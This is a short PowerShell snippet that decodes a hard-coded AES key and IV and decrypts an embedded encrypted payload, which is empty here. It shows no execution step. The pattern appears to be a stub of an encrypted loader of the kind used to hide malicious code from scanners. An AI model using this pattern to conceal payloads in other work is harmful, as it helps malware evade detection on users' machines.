
$key = [System.Convert]::FromBase64String("rn+0XSdoHRRo1Gk/TE4KztUW+i+IXP/kVeWNGOmGXQ0=")
$iv = [System.Convert]::FromBase64String("6NjUsdUfqXj/lfCSrXk4MQ==")
$encryptedCode = [System.Convert]::FromBase64String("")

$decryptor = (New-Object System.Security.Cryptography.AesCryptoServiceProvider).CreateDecryptor($key, $iv)
$decryptedCode = $decryptor.TransformFinalBlock($encryptedCode, 0, $encryptedCode.Length)
